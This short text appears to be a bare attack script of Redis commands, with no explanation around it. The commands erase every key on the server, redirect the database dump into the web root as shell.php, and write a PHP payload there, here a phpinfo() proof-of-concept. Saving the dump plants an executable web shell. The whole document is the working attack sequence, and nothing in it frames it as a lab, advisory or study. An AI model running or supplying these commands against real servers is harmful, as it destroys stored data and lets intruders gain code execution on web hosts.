flushall
config set dir /var/www/html
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
save
